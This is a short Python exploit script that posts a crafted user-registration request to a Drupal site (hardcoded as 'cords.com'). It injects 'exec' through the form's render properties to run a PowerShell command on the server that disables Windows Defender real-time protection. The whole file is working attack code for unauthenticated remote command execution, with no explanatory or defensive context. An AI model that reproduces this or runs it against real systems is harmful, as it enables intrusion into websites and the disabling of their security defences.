#!/usr/bin/python3

import requests
requests.packages.urllib3.disable_warnings() 

target = "http://cords.com/"


#Disable Windows Defender
command = "powershell Set-MpPreference -DisableRealtimeMonitoring $true"

url = target + '/admin/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': command }
print("Disabling AV on "+target+" ...")
r = requests.post(url, data=payload, verify=False)
print("Complete")
